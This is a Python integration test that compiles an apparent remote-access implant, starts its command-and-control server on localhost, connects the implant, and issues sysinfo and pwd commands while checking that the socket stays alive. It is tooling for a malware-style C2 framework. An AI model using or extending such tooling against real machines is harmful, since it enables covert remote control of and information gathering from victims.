#!/usr/bin/env python3
"""Test with delays between commands"""

import os, sys, time, threading, subprocess, signal
sys.path.insert(0, '/workspace')

c2_port = 16700

# Compile
os.chdir('/workspace/native_payloads')
env = os.environ.copy()
env['C2_HOST'] = '127.0.0.1'
env['C2_PORT'] = str(c2_port)
result = subprocess.run(['bash', './build.sh'], capture_output=True, env=env, timeout=30)
print('✅ Compiled')

# Start C2
def run_c2():
    from Application import stitch_cmd
    server = stitch_cmd.stitch_server()
    server.l_port = c2_port
    server.run_server()
c2_thread = threading.Thread(target=run_c2, daemon=True)
c2_thread.start()
time.sleep(3)

# Launch payload
payload_proc = subprocess.Popen(['/workspace/native_payloads/output/payload_native'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
time.sleep(5)

from web_app_real import get_stitch_server
from native_protocol_bridge import send_command_to_native_payload

server = get_stitch_server()
target_id = list(server.inf_sock.keys())[0]
sock = server.inf_sock[target_id]

print(f'Connected: {target_id}')

# Test multiple commands with delays
commands = ['ping', 'sysinfo', 'pwd', 'ping']

for i, cmd in enumerate(commands, 1):
    print(f'\\nCommand {i}: {cmd}')
    try:
        success, output = send_command_to_native_payload(sock, cmd)
        print(f'  Result: {"✅" if success else "❌"} Success')
        if output:
            print(f'  Output: {output[:50]}')
    except Exception as e:
        print(f'  ❌ Exception: {e}')
        break
    
    # Check socket
    try:
        sock.getpeername()
        print(f'  ✅ Socket connected')
    except:
        print(f'  ❌ Socket DISCONNECTED')
        break
    
    time.sleep(2)  # Delay between commands

print('\\n' + '='*50)
print(f'Successfully executed {i} commands' if i == len(commands) else f'Failed after {i} commands')

# Cleanup
try:
    os.killpg(os.getpgid(payload_proc.pid), signal.SIGKILL)
except:
    pass
